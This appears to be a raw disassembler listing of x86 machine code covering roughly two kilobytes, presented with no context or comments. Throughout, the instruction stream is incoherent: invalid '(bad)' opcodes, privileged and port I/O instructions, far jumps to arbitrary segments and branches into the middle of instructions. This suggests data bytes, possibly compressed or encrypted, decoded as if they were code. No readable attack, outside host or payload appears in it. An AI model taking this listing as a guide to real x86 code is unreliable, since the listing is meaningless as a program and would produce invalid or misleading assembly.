  409187:	jmp    0x93d6:0xd7b98fe9
  40918e:	fisub  DWORD PTR [edx+eax*1]
  409191:	sbb    BYTE PTR [eax+ebx*2],ah
  409194:	adc    BYTE PTR [esi],ah
  409196:	inc    edi
  409197:	sar    BYTE PTR [ebx],0x8
  40919a:	add    al,0xdd
  40919c:	push   edi
  40919d:	fild   QWORD PTR ss:[bp+di]
  4091a1:	int3   
  4091a2:	imul   edx,ebp,0x32
  4091a5:	sti    
  4091a6:	lahf   
  4091a7:	imul   ecx,DWORD PTR [edi],0x29c2afa8
  4091ad:	mov    es,ebp
  4091af:	test   DWORD PTR [edi-0x29],0x8384b483
  4091b6:	push   0x5d
  4091b8:	scas   eax,DWORD PTR es:[edi]
  4091b9:	jne    0x4091fd
  4091bb:	mov    esp,0xa6a83f35
  4091c0:	inc    DWORD PTR [ebp+0x7b]
  4091c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091c4:	push   esp
  4091c5:	iret   
  4091c6:	adc    bp,di
  4091c9:	fst    QWORD PTR [edx+0x63863731]
  4091cf:	sbb    BYTE PTR [edx+0x37],al
  4091d2:	sbb    BYTE PTR [ebx-0x7b4fafcb],0x23
  4091d9:	mov    ah,0xfe
  4091db:	sbb    dh,al
  4091dd:	sahf   
  4091de:	outs   dx,DWORD PTR ds:[esi]
  4091df:	mov    ds:0xe47ee4cc,eax
  4091e4:	hlt    
  4091e5:	push   esi
  4091e6:	mov    edi,0xeea28ac
  4091ec:	(bad)  
  4091ed:	lods   al,BYTE PTR ds:[esi]
  4091ee:	jge    0x4091ec
  4091f0:	scas   al,BYTE PTR es:[edi]
  4091f1:	mov    ecx,0x7b6698a6
  4091f6:	(bad)  
  4091f7:	jmp    0x3489:0xd3a4d842
  4091fe:	dec    edi
  4091ff:	jl     0x40919f
  409201:	dec    esp
  409202:	push   ds
  409203:	imul   eax,DWORD PTR es:0x65e23f0f,0xffffffd3
  40920b:	and    DWORD PTR [ebp+eax*4-0x71],edi
  40920f:	pop    esi
  409210:	aas    
  409211:	cmp    ebp,DWORD PTR [edx+0x1e9e2609]
  409217:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409218:	popf   
  409219:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40921a:	ja     0x4091b8
  40921c:	fisubr WORD PTR ds:0xd87f344b
  409222:	loop   0x409261
  409224:	mov    dh,0x63
  409226:	dec    edi
  409227:	repnz loopne 0x4091ac
  40922a:	sub    ch,BYTE PTR [eax-0x3b9ec714]
  409230:	inc    ebp
  409231:	mov    ds:0xa8fff960,al
  409236:	ja     0x409253
  409238:	sar    BYTE PTR [eax],1
  40923a:	jnp    0x4092b1
  40923c:	pop    edx
  40923d:	les    esp,FWORD PTR [ebp+0x56a1267d]
  409243:	rcr    eax,0x9e
  409246:	dec    ecx
  409247:	fmul   st,st(2)
  409249:	retf   
  40924a:	dec    eax
  40924b:	lock xchg ebx,eax
  40924d:	pop    ecx
  40924e:	push   ebx
  40924f:	or     DWORD PTR [ebx+0x12],ebx
  409252:	aam    0xd0
  409254:	xor    esp,DWORD PTR [eax+0x4120d767]
  40925a:	lods   al,BYTE PTR ds:[esi]
  40925b:	(bad)  
  40925c:	je     0x4092b6
  40925e:	out    0x32,eax
  409260:	out    dx,eax
  409261:	sub    ch,bh
  409263:	xchg   edi,eax
  409264:	jo     0x4092b5
  409266:	cmp    esi,edx
  409268:	jns    0x4092bd
  40926a:	push   es
  40926b:	push   es
  40926c:	ret    0x28a6
  40926f:	fnstsw WORD PTR [edx]
  409271:	pop    esp
  409272:	sub    cl,BYTE PTR [esi+0x46]
  409275:	loopne 0x409209
  409277:	add    al,0xb8
  409279:	adc    DWORD PTR [edi-0x41fadbd4],ebp
  40927f:	mov    edi,0x4dea19
  409284:	sub    BYTE PTR [eax+0x47],bl
  409287:	and    al,0xb
  409289:	ds dec edi
  40928b:	add    dh,dl
  40928d:	ror    ah,1
  40928f:	mov    ah,0xc8
  409291:	xor    DWORD PTR [esi+0x3ead6059],ecx
  409297:	sti    
  409298:	inc    ebp
  409299:	mov    ebx,0x684c83c4
  40929e:	sbb    BYTE PTR [ecx+0x16a2d1a6],dh
  4092a4:	ins    DWORD PTR es:[edi],dx
  4092a5:	push   ecx
  4092a6:	sub    BYTE PTR [edx-0x5f],cl
  4092a9:	mov    eax,ds:0x490d2ac0
  4092ae:	arpl   si,si
  4092b0:	mov    ds:0xa032a0c0,eax
  4092b5:	inc    ebx
  4092b6:	outs   dx,DWORD PTR ds:[esi]
  4092b7:	and    BYTE PTR [eax*2+0x146f432e],dh
  4092be:	ja     0x4092ea
  4092c0:	test   BYTE PTR [ebx-0x3d],al
  4092c3:	rep lods al,BYTE PTR ds:[esi]
  4092c5:	or     al,0x15
  4092c7:	cli    
  4092c8:	mov    ecx,DWORD PTR [edx+0x4e]
  4092cb:	dec    eax
  4092cc:	das    
  4092cd:	and    eax,0x5df1b80f
  4092d2:	xor    al,0xa5
  4092d4:	or     BYTE PTR [edx],bh
  4092d6:	jo     0x4092c1
  4092d8:	xchg   ecx,eax
  4092d9:	(bad)  
  4092db:	inc    ebx
  4092dc:	cwde   
  4092dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4092de:	jno    0x409264
  4092e0:	repz xor eax,0x21cf41e9
  4092e6:	aad    0x96
  4092e8:	ja     0x4092b2
  4092ea:	out    0x7a,al
  4092ec:	and    DWORD PTR [ecx+0x1eea3008],esi
  4092f2:	xchg   esi,eax
  4092f3:	ja     0x409327
  4092f5:	inc    esp
  4092f6:	and    al,0xd2
  4092f8:	inc    ebx
  4092f9:	and    DWORD PTR [edx+0x1],esp
  4092fc:	mov    edx,0xdece0a2e
  409301:	jns    0x40936c
  409303:	ror    cl,cl
  409305:	gs inc esp
  409307:	xor    BYTE PTR [eax],cl
  409309:	xor    al,dl
  40930b:	xor    DWORD PTR [esi],esi
  40930d:	push   edx
  40930e:	outs   dx,DWORD PTR ds:[esi]
  40930f:	push   ecx
  409310:	(bad)  [ebx+0x4f315e11]
  409316:	jecxz  0x409332
  409318:	mov    bh,0x73
  40931a:	icebp  
  40931b:	aas    
  40931c:	jb     0x40932c
  40931e:	mov    edx,0xc23f6134
  409323:	push   edx
  409324:	arpl   di,cx
  409326:	sbb    bl,0xf3
  409329:	fldenv [edi]
  40932b:	jno    0x4092de
  40932d:	aas    
  40932e:	mov    bh,0xb
  409330:	pop    ebx
  409331:	out    dx,al
  409332:	sbb    ah,BYTE PTR [ebx+0x1b]
  409335:	std    
  409336:	stos   BYTE PTR es:[edi],al
  409337:	mov    eax,ds:0x38c508eb
  40933c:	xchg   edi,eax
  40933d:	push   cs
  40933e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40933f:	aam    0xc0
  409341:	out    0x0,al
  409343:	xchg   esi,eax
  409344:	aaa    
  409345:	jns    0x40936a
  409347:	sbb    al,0x15
  409349:	arpl   WORD PTR [ebx+0x57],di
  40934c:	adc    DWORD PTR [ebp-0x2c],0xd38ffd3d
  409353:	icebp  
  409354:	add    BYTE PTR [esi-0x7c478b8e],0x9b
  40935b:	arpl   bp,sp
  40935d:	imul   ebp,DWORD PTR [eax-0x6b0cd0d1],0x4dbaf9ff
  409367:	mov    ebp,0xe54f242e
  40936c:	sbb    al,0x86
  40936f:	imul   ebx,DWORD PTR [ecx-0x25cc2fe6],0x22
  409376:	das    
  409377:	popf   
  409378:	jns    0x409359
  40937a:	add    bl,dh
  40937c:	(bad)  
  40937d:	shl    DWORD PTR ds:0x8fb8ada8,cl
  409383:	les    edx,FWORD PTR ds:0xb4691218
  409389:	sar    esp,cl
  40938b:	sbb    al,BYTE PTR [ebp+0x29]
  40938e:	ss jb  0x409408
  409391:	mov    ecx,0xb2f8bb2c
  409396:	loop   0x409415
  409398:	xchg   ebp,eax
  409399:	jle    0x409414
  40939b:	mov    DWORD PTR [edx],ebx
  40939d:	adc    ah,BYTE PTR [ecx]
  40939f:	xchg   DWORD PTR [eax+0xf9ca561],edi
  4093a5:	add    DWORD PTR [edi+ecx*1+0x46],0xc6da38e4
  4093ad:	push   edx
  4093ae:	repnz or BYTE PTR [edi+0x6e],0x4a
  4093b3:	xor    bl,BYTE PTR [ebp*4-0x6bcf4e93]
  4093ba:	xchg   edi,eax
  4093bb:	cmp    BYTE PTR [eax+0x1235dbb7],bh
  4093c1:	jp     0x409395
  4093c3:	ja     0x4093f0
  4093c5:	in     eax,dx
  4093c6:	push   cs
  4093c7:	sbb    DWORD PTR [edx+0x685f81bd],ebx
  4093cd:	pop    dx
  4093cf:	push   ebp
  4093d0:	adc    BYTE PTR [ebp-0x67],cl
  4093d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4093d4:	sbb    edx,DWORD PTR [esi-0x46]
  4093d7:	add    eax,0xec635c7b
  4093dc:	cwde   
  4093dd:	sbb    DWORD PTR [esi],0x65e8fea9
  4093e3:	push   ss
  4093e4:	(bad)  
  4093e5:	mov    dl,0xbb
  4093e7:	sub    al,0x3
  4093e9:	(bad)  
  4093ea:	adc    eax,0x63d889a5
  4093ef:	dec    DWORD PTR [edx]
  4093f1:	push   edx
  4093f2:	das    
  4093f3:	push   ss
  4093f4:	cmp    esp,DWORD PTR [ebx+0x2a0fe508]
  4093fa:	inc    ebp
  4093fb:	mov    DWORD PTR [esi-0x79c9adb0],esi
  409401:	sub    al,0x4b
  409403:	stos   DWORD PTR es:[edi],eax
  409404:	neg    esi
  409406:	in     al,0x36
  409408:	pop    edi
  409409:	hlt    
  40940a:	dec    edi
  40940b:	fs dec ecx
  40940d:	ja     0x409483
  40940f:	into   
  409410:	lds    edi,FWORD PTR [ebp+0xe2068ec]
  409416:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409417:	ficomp WORD PTR [ecx+0x56]
  40941a:	stos   DWORD PTR es:[edi],eax
  40941b:	dec    esp
  40941c:	in     eax,dx
  40941d:	les    eax,FWORD PTR [ecx]
  40941f:	sub    ecx,DWORD PTR [edx-0x33d92f10]
  409425:	sub    esp,ecx
  409427:	jmp    0x94344f5
  40942c:	ret    
  40942d:	mov    al,0x7c
  40942f:	jl     0x40942f
  409431:	jbe    0x40940f
  409433:	push   esp
  409434:	or     ebx,DWORD PTR [ecx+ecx*1+0x7a]
  409438:	inc    ebp
  409439:	adc    DWORD PTR [ebx+0x3144a8ab],0xffffffa3
  409440:	into   
  409441:	ss dec esi
  409443:	xchg   esp,eax
  409444:	inc    edx
  409445:	jecxz  0x409473
  409447:	xchg   ecx,eax
  409448:	cmp    esp,eax
  40944a:	mov    dl,0x76
  40944c:	or     BYTE PTR [ecx],al
  40944e:	pop    ss
  40944f:	pushf  
  409450:	cmp    DWORD PTR [esi-0x4cd04227],0xb21ce4a4
  40945a:	repnz loope 0x409473
  40945d:	inc    ecx
  40945e:	pop    esi
  40945f:	sbb    DWORD PTR [ebx-0x61dfd20f],eax
  409465:	cmp    eax,0x1dbe1206
  40946a:	inc    BYTE PTR [ecx+0x8]
  40946d:	inc    edx
  40946e:	xor    BYTE PTR [edi+0x7807e925],bl
  409474:	sbb    BYTE PTR [eax-0x7749c3e8],cl
  40947a:	cdq    
  40947b:	pushf  
  40947c:	add    esp,DWORD PTR ds:0x34726c07
  409482:	popa   
  409483:	pop    es
  409484:	popf   
  409485:	loopne 0x4094bb
  409487:	out    dx,eax
  409488:	out    0x2d,al
  40948a:	jno    0x4094a7
  40948c:	in     eax,dx
  40948d:	pusha  
  40948e:	push   ds
  40948f:	mov    es,WORD PTR [esi-0x3b]
  409492:	push   ebp
  409494:	lods   al,BYTE PTR ds:[esi]
  409495:	lods   al,BYTE PTR ds:[esi]
  409496:	or     dl,BYTE PTR [ecx]
  409498:	(bad)  [eax-0x30]
  40949b:	call   0x7a34794a
  4094a0:	inc    edx
  4094a1:	xor    ah,BYTE PTR [edi]
  4094a3:	dec    esp
  4094a4:	sbb    dh,ah
  4094a6:	outs   dx,DWORD PTR ds:[esi]
  4094a7:	cwde   
  4094a8:	mov    esi,0x517ad1d0
  4094ad:	pop    ds
  4094ae:	(bad)  
  4094af:	out    dx,al
  4094b0:	in     al,dx
  4094b1:	and    cl,BYTE PTR [ebx-0x92d0479]
  4094b7:	bound  ebx,QWORD PTR [esi+eiz*8]
  4094ba:	(bad)  [ebp-0x80]
  4094bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4094be:	fadd   QWORD PTR [ebp+0x367aa666]
  4094c4:	mov    fs,WORD PTR [eax+0x3ccb4c76]
  4094ca:	mov    esi,0x9d37227
  4094cf:	ins    DWORD PTR es:[edi],dx
  4094d0:	sahf   
  4094d1:	sbb    eax,0x18e13ab
  4094d6:	and    ch,BYTE PTR [eax-0x1abfea7d]
  4094dc:	cdq    
  4094dd:	and    eax,0xaab47db1
  4094e2:	push   ecx
  4094e3:	call   0x59a75c3a
  4094e8:	call   0xdda9c9fb
  4094ed:	dec    edi
  4094ee:	dec    eax
  4094ef:	mov    ebp,0xb427e2fb
  4094f4:	and    al,0x68
  4094f6:	inc    ecx
  4094f7:	dec    edi
  4094f8:	xchg   ebx,eax
  4094f9:	dec    esi
  4094fa:	adc    BYTE PTR [edx+0x1a728eda],ah
  409500:	mov    bh,0x82
  409502:	cwde   
  409503:	adc    eax,0xcfd7da7d
  409508:	aaa    
  409509:	pop    es
  40950a:	or     edx,DWORD PTR [ebx-0x17abdcbf]
  409510:	adc    edi,DWORD PTR [edi]
  409512:	mov    fs,WORD PTR [ebp+ecx*8-0x1d]
  409516:	cmp    eax,DWORD PTR [edx+0x2]
  409519:	sub    ah,ah
  40951b:	les    edx,FWORD PTR [edi]
  40951d:	lds    ecx,FWORD PTR [edi]
  40951f:	push   cs
  409520:	and    ch,BYTE PTR [ebx+0x6680f1db]
  409526:	out    0xe6,eax
  409528:	cmp    bl,BYTE PTR [ebx+0x6]
  40952b:	add    BYTE PTR [edx-0x30],ch
  40952e:	rcr    eax,1
  409530:	sub    DWORD PTR [ebx-0x5df8d1a2],0x7310af61
  40953a:	xchg   edx,eax
  40953b:	out    dx,eax
  40953c:	jl     0x40951e
  40953e:	sahf   
  40953f:	ins    DWORD PTR es:[edi],dx
  409540:	rcl    DWORD PTR [eax+eax*1+0x5bb6be9c],0x58
  409548:	pop    eax
  409549:	lods   eax,DWORD PTR ds:[esi]
  40954a:	int    0xb8
  40954c:	and    edx,DWORD PTR [eax+0x36]
  40954f:	ficomp WORD PTR [eax+0x8aaa3ef]
  409555:	aam    0x4f
  409557:	adc    eax,0x8a0ae501
  40955c:	xchg   BYTE PTR [ebp-0x78194558],bl
  409562:	cmp    al,0x60
  409564:	mov    edi,0x612ddb5a
  409569:	iret   
  40956a:	sbb    BYTE PTR [ebx-0x79],bh
  40956d:	pop    DWORD PTR [eax-0x30]
  409570:	jnp    0x4095c6
  409572:	push   cs
  409573:	dec    edi
  409574:	repnz xor BYTE PTR [edi+0x8],bh
  409578:	test   BYTE PTR ds:0xcf34a106,dl
  40957e:	outs   dx,DWORD PTR ds:[esi]
  40957f:	or     BYTE PTR [edi],ch
  409581:	push   ecx
  409582:	pop    es
  409583:	lock stos DWORD PTR es:[edi],eax
  409585:	mov    DWORD PTR [edi],edx
  409587:	jns    0x4095a5
  409589:	push   eax
  40958a:	retf   0x3791
  40958d:	jne    0x409550
  40958f:	xor    al,bh
  409591:	or     BYTE PTR [eax+edx*8-0x2f8296e0],dl
  409598:	pop    DWORD PTR [edi+0x56b03847]
  40959e:	jge    0x409567
  4095a0:	and    BYTE PTR [eax-0x37],dl
  4095a3:	add    cl,BYTE PTR [edi-0x14611eb4]
  4095a9:	jns    0x4095df
  4095ab:	sub    eax,0x85689f78
  4095b0:	jno    0x4095c0
  4095b2:	cli    
  4095b3:	fdivp  st(1),st
  4095b5:	std    
  4095b6:	test   al,0xdf
  4095b8:	push   esi
  4095b9:	push   edi
  4095ba:	fisttp DWORD PTR [edi+0x3b141925]
  4095c0:	jne    0x409542
  4095c2:	sub    ah,BYTE PTR [ecx-0x455f3588]
  4095c8:	adc    eax,0x644aa500
  4095cd:	push   esi
  4095ce:	daa    
  4095cf:	push   esp
  4095d0:	mov    edi,0xf082d793
  4095d5:	call   DWORD PTR [ecx-0x51]
  4095d8:	mov    eax,ds:0xab58f5ce
  4095dd:	adc    al,0xfa
  4095df:	add    al,0x99
  4095e1:	jg     0x409602
  4095e3:	cmp    ebp,eax
  4095e5:	fdiv   st(2),st
  4095e7:	or     eax,0xae4278f0
  4095ec:	push   cs
  4095ed:	and    edi,DWORD PTR [edi-0x6d039bf3]
  4095f3:	adc    eax,0x70e0fa38
  4095f8:	pushf  
  4095f9:	sub    ah,dh
  4095fb:	hlt    
  4095fc:	test   al,0x5c
  4095fe:	xchg   BYTE PTR [edx+0x1667f1b],ch
  409604:	dec    eax
  409605:	jmp    0xfb26:0x4f4e7e33
  40960c:	stc    
  40960d:	cmp    al,0xab
  40960f:	retf   0x2727
  409612:	mov    dl,0xfb
  409614:	std    
  409615:	adc    DWORD PTR [edi+0x2fa0eeac],0x35c079b
  40961f:	out    dx,eax
  409620:	imul   edi,DWORD PTR [edi-0x49],0x42
  409624:	not    DWORD PTR [ebp+0x44]
  409627:	jb     0x409601
  409629:	in     al,dx
  40962a:	adc    esp,edi
  40962c:	mov    bh,0xf4
  40962e:	mov    ds:0xb482f46c,eax
  409633:	adc    DWORD PTR [ebx-0x51b0e408],0x2a
  40963a:	test   eax,0xf953177d
  40963f:	push   cs
  409640:	mov    bh,0xbd
  409642:	cmp    BYTE PTR [eax],bl
  409644:	and    al,0xbc
  409646:	leave  
  409647:	xor    eax,0x25558730
  40964c:	mov    ebx,DWORD PTR [ecx-0x25]
  40964f:	outs   dx,BYTE PTR ds:[esi]
  409650:	jmp    DWORD PTR [edi]
  409652:	push   eax
  409653:	sbb    ebx,DWORD PTR [ebp+0x68cd1e80]
  409659:	and    eax,esi
  40965b:	fsubr  QWORD PTR [esp+ebx*2-0x4d0621ae]
  409662:	rcr    eax,1
  409664:	push   esi
  409665:	rol    ecx,cl
  409667:	arpl   WORD PTR [edx-0x7d],si
  40966a:	xchg   esi,eax
  40966b:	sub    al,al
  40966d:	or     BYTE PTR [edi],bl
  40966f:	mov    DWORD PTR ds:0xe3e0e8dd,ebp
  409675:	jmp    0x4096bd
  409677:	dec    ecx
  409678:	or     al,0x80
  40967a:	jb     0x409671
  40967c:	loop   0x40961b
  40967e:	call   FWORD PTR [edi-0x69]
  409681:	ret    0x695b
  409684:	xchg   ebx,eax
  409685:	cdq    
  409686:	xchg   edx,eax
  409687:	paddusb mm5,QWORD PTR [esi]
  40968a:	add    DWORD PTR [esi-0x18],eax
  40968d:	repnz mov es,WORD PTR [ecx+0x76]
  409691:	(bad)  
  409693:	mul    DWORD PTR [esi+ecx*8-0xa]
  409697:	daa    
  409698:	ficomp WORD PTR [edi]
  40969a:	adc    cl,ah
  40969c:	in     eax,dx
  40969d:	(bad)  [edx-0x6054f37f]
  4096a3:	dec    ecx
  4096a4:	mov    edi,0x65a7044c
  4096a9:	dec    ecx
  4096aa:	jbe    0x40968c
  4096ac:	xchg   ebp,eax
  4096ad:	test   al,0x18
  4096af:	(bad)
  4096b4:	pusha  
  4096b5:	loope  0x4096df
  4096b7:	fs inc ebx
  4096b9:	ja     0x4096cd
  4096bb:	inc    ebp
  4096bc:	daa    
  4096bd:	cs xchg esi,eax
  4096bf:	xor    eax,0xcdf97998
  4096c4:	or     bl,al
  4096c6:	cmp    edx,0x51218223
  4096cc:	std    
  4096cd:	(bad)  
  4096ce:	or     eax,0x555a780b
  4096d3:	jb     0x4096dc
  4096d5:	loopne 0x40967f
  4096d7:	xor    al,0x52
  4096d9:	dec    edx
  4096da:	and    DWORD PTR [ecx-0x74],edi
  4096dd:	aad    0x6d
  4096df:	xor    eax,esi
  4096e1:	add    eax,0x7217f23c
  4096e6:	retw   0x5544
  4096ea:	xor    BYTE PTR [ecx+edx*4+0x47],al
  4096ee:	test   al,0x4b
  4096f0:	fwait
  4096f1:	push   ds
  4096f2:	dec    ecx
  4096f3:	jae    0x409675
  4096f5:	add    al,0x84
  4096f7:	test   al,0x4b
  4096f9:	pop    ecx
  4096fa:	and    al,0x8c
  4096fc:	xlat   BYTE PTR ds:[ebx]
  4096fd:	and    eax,DWORD PTR [ecx]
  4096ff:	or     ch,ah
  409701:	and    bl,BYTE PTR [edi+0x2c]
  409704:	int3   
  409705:	popf   
  409706:	sar    dl,1
  409708:	ror    ch,1
  40970a:	into   
  40970b:	mov    edi,DWORD PTR [ecx]
  40970d:	dec    ecx
  40970e:	add    DWORD PTR [eax],ebx
  409710:	mov    BYTE PTR [edi-0x57],ah
  409713:	pop    edi
  409714:	pop    ebp
  409715:	cmp    BYTE PTR [ebx+eiz*4],cl
  409718:	adc    edx,DWORD PTR [ebx+0x130b6729]
  40971e:	les    edi,FWORD PTR [eax]
  409720:	daa    
  409721:	test   BYTE PTR [ebx],0x2c
  409724:	outs   dx,DWORD PTR ds:[esi]
  409725:	inc    ecx
  409726:	popa   
  409727:	ret    
  409728:	pop    es
  409729:	dec    edi
  40972a:	mov    ebx,0xe68bd8c7
  40972f:	and    ebx,DWORD PTR [eax-0x1a67dec]
  409735:	ficom  DWORD PTR [eax-0x3979c60b]
  40973b:	mov    bl,0x33
  40973d:	mov    DWORD PTR [edi-0x20eaa04f],ebx
  409743:	aam    0xff
  409745:	and    BYTE PTR [esi+0x25],al
  409748:	xchg   ebx,eax
  409749:	xor    eax,eax
  40974b:	cdq    
  40974c:	ja     0x4096e6
  40974e:	scas   al,BYTE PTR es:[edi]
  40974f:	mov    esi,0x2bd49a72
  409754:	push   edx
  409755:	xor    al,0x47
  409757:	ret    0x6a7a
  40975a:	shl    BYTE PTR [edx+ebp*8],1
  40975d:	js     0x4096ed
  40975f:	sub    edx,ebx
  409761:	push   ebx
  409762:	adc    BYTE PTR [esi+0x387130de],0xeb
  409769:	pusha  
  40976a:	mov    esp,0x7a185009
  40976f:	add    BYTE PTR [edi+eiz*1-0x55],dh
  409773:	(bad)  
  409774:	jl     0x4097cd
  409776:	push   0x9b5f8061
  40977b:	or     esi,ebp
  40977d:	(bad)  
  40977e:	fwait
  40977f:	mov    esi,0xfbee5c39
  409784:	push   ebx
  409785:	jmp    0x475d22d1
  40978a:	retf   0xcb63
  40978d:	jecxz  0x409781
  40978f:	mov    edx,DWORD PTR [edi-0x48]
  409792:	test   al,0x65
  409794:	push   0xffffffe9
  409796:	push   ds
  409797:	and    BYTE PTR [ebx-0x7a],bl
  40979a:	int    0xfc
  40979c:	js     0x40972a
  40979e:	lods   al,BYTE PTR ds:[esi]
  40979f:	and    ebp,DWORD PTR [eax]
  4097a1:	daa    
  4097a2:	out    0x90,eax
  4097a4:	adc    ecx,esp
  4097a6:	xchg   edi,eax
  4097a7:	loopne 0x4097dd
  4097a9:	add    ebx,0x4129ffcf
  4097af:	daa    
  4097b0:	jmp    0x8bbf5c34
  4097b5:	outs   dx,BYTE PTR ds:[esi]
  4097b6:	adc    BYTE PTR [edx-0xec209cd],dl
  4097bc:	test   eax,0xababa5ec
  4097c1:	(bad)  
  4097c2:	pop    ecx
  4097c3:	scas   al,BYTE PTR es:[edi]
  4097c4:	mov    ebp,0xd724752d
  4097c9:	adc    dl,BYTE PTR [eax-0x5]
  4097cc:	imul   esi,DWORD PTR [ebx],0x40
  4097cf:	mov    edx,0xb3fb9130
  4097d4:	xchg   BYTE PTR [esi-0x4e],bh
  4097d7:	aam    0x2
  4097d9:	mov    ebx,0x78cbed68
  4097de:	xor    DWORD PTR gs:[edi-0x48e9e575],esi
  4097e5:	or     cl,ah
  4097e7:	test   bl,bh
  4097e9:	adc    DWORD PTR [eax-0x57],esi
  4097ec:	push   edx
  4097ed:	retf   0xbb35
  4097f0:	jecxz  0x4097a0
  4097f2:	icebp  
  4097f3:	sub    ah,bh
  4097f5:	lods   al,BYTE PTR ds:[esi]
  4097f6:	in     eax,0x78
  4097f8:	test   eax,0xcc7456ca
  4097fd:	xor    bh,bh
  4097ff:	inc    esp
  409800:	mov    ds,eax
  409802:	pop    ecx
  409803:	cli    
  409804:	jp     0x409876
  409806:	adc    dl,BYTE PTR [ebp-0x36df7227]
  40980c:	or     bl,0x31
  40980f:	imul   eax,DWORD PTR [eax-0x5a],0x4c
  409813:	xchg   ecx,eax
  409814:	cmp    al,0x2b
  409816:	dec    ecx
  409817:	iret   
  409818:	add    DWORD PTR [edi-0x5],eax
  40981b:	mov    esp,0x2fb2724
  409820:	outs   dx,BYTE PTR ds:[esi]
  409821:	call   0xfe0e4af
  409826:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409827:	mov    ch,BYTE PTR [ecx]
  409829:	add    dl,BYTE PTR [esi+edx*1-0xc98cac7]
  409830:	addr16 in eax,0x79
  409833:	outs   dx,DWORD PTR ds:[esi]
  409834:	(bad)  
  409835:	push   ebp
  409836:	cmp    al,0xc5
  409838:	pusha  
  409839:	xchg   BYTE PTR [ebp+ebp*2-0x31],ah
  40983d:	das    
  40983e:	call   0xd53b:0xdae9103d
  409845:	fs push ss
  409847:	aam    0x66
  409849:	xchg   esp,eax
  40984a:	mov    DWORD PTR [eax+edx*2+0x8],esp
  40984e:	push   ebx
  40984f:	addr16 popf 
  409851:	adc    BYTE PTR [ebx+0x4c],ah
  409854:	and    eax,0x516b4339
  409859:	inc    ebx
  40985a:	lods   al,BYTE PTR ds:[esi]
  40985b:	lea    edx,ds:0x462e7fc1
  409861:	sahf   
  409862:	and    cl,BYTE PTR [eax-0x13104f3c]
  409868:	and    esp,DWORD PTR ds:0x57db762b
  40986e:	adc    BYTE PTR [ebx-0x13],0xf6
  409872:	sbb    DWORD PTR [ebx+0x3a],0x3d
  409876:	scas   eax,DWORD PTR es:[edi]
  409877:	es push es
  409879:	push   cs
  40987a:	call   0xb556:0x60066cb0
  409881:	sub    DWORD PTR [esi],ebp
  409883:	fs (bad) 
  409885:	lds    ebx,FWORD PTR [esi+0x178445a5]
  40988b:	or     DWORD PTR [ecx+0x31385b38],edi
  409891:	out    0xc4,eax
  409893:	jg     0x409828
  409895:	into   
  409896:	test   DWORD PTR gs:[edi+0x4826b27e],ebx
  40989d:	jbe    0x4098fd
  40989f:	and    al,0xd8
  4098a1:	lahf   
  4098a2:	or     DWORD PTR [esi-0x5a6126eb],edx
  4098a8:	mov    al,ds:0x8bfc49c7
  4098ad:	(bad)  
  4098ae:	fs call 0x5b03d788
  4098b4:	cmp    al,BYTE PTR [edx]
  4098b6:	jae    0x409851
  4098b8:	mov    esp,0x32b7bc01
  4098bd:	mov    edx,0x6aa15b24
  4098c2:	dec    esp
  4098c3:	fwait
  4098c4:	pop    eax
  4098c5:	push   esi
  4098c6:	clc    
  4098c7:	push   esi
  4098c8:	or     DWORD PTR ds:0x8233d878,esi
  4098ce:	cdq    
  4098cf:	xchg   esi,eax
  4098d0:	fdiv   DWORD PTR [ebx-0x1e]
  4098d3:	mov    dh,0xf7
  4098d5:	outs   dx,DWORD PTR ds:[esi]
  4098d6:	pop    ds
  4098d7:	adc    eax,0xf5b683bb
  4098dc:	aam    0x8f
  4098de:	stos   BYTE PTR es:[edi],al
  4098df:	out    0xb,al
  4098e1:	push   ebp
  4098e2:	ss mov edx,0xd7e9ffa2
  4098e8:	sar    BYTE PTR [edx+esi*1-0xc],1
  4098ec:	jae    0x409950
  4098ee:	jmp    0xe58f56af
  4098f3:	inc    esp
  4098f4:	pop    edx
  4098f5:	loopne 0x409968
  4098f7:	fcmovb st,st(0)
  4098f9:	pop    ebp
  4098fa:	sub    eax,0xb83f8497
  4098ff:	test   esi,ebx
  409901:	pop    esp
  409902:	or     al,0x5d
  409904:	pop    edi
  409905:	mov    bh,0x77
  409907:	inc    edi
  409908:	and    DWORD PTR [ebp+0x79],esp
  40990b:	rol    ch,0xca
  40990e:	retf   
  40990f:	imul   esi,eax,0xb0985b30
  409915:	sbb    edi,DWORD PTR [edi+0x72e31a76]
  40991b:	add    DWORD PTR [eax],ecx
  40991d:	inc    esi
  40991e:	mov    al,ds:0xc450f984
  409923:	inc    esp
  409924:	xlat   BYTE PTR ds:[ebx]
  409925:	fild   QWORD PTR [edx+0x9]
  409928:	sub    DWORD PTR [eax+0x73],0xa809ab8d
  40992f:	push   esi
  409930:	fisttp WORD PTR [edx+0x3edc51ec]
  409936:	(bad)  
  409937:	not    ebp
  409939:	and    edi,DWORD PTR [eax+eax*2]
  40993c:	daa    
  40993d:	inc    esp
  40993e:	cmp    eax,0xd6294737
  409943:	push   ebx
  409944:	inc    ebp
  409945:	out    dx,al
  409946:	lock shl ch,cl
  409949:	and    eax,0xf5b2bf58
  40994e:	adc    eax,0x4f7c808c
  409953:	hlt    
  409954:	shr    DWORD PTR [edi],0x53
  409957:	leave  
  409958:	inc    edi
  409959:	stos   BYTE PTR es:[edi],al
  40995a:	pop    ds
  40995b:	sti    
  40995c:	loopne 0x40998a
  40995e:	shl    DWORD PTR [edx+0x36],0xea
  409962:	xor    esp,DWORD PTR [esi+ebp*8+0x5b374de]
  409969:	add    eax,0xfde523a9
  40996e:	push   ss
  40996f:	hlt    
  409970:	cmp    eax,eax
  409972:	jnp    0x409985
  409974:	lock sub al,0x2f
  409977:	mov    al,0x7c
  409979:	xchg   edx,eax
  40997a:	mov    dl,0xe1
  40997c:	xor    BYTE PTR [edi+0x20],0x63
  409980:	push   0xffffffa4
  409982:	pop    es
  409983:	inc    ecx
  409984:	shr    DWORD PTR [ebx-0x231a4cc7],cl
  40998a:	add    DWORD PTR [ecx+0x37],eax
  40998d:	in     al,0x93
  40998f:	pop    edx
  409990:	out    0x3a,eax
  409992:	pop    ebx
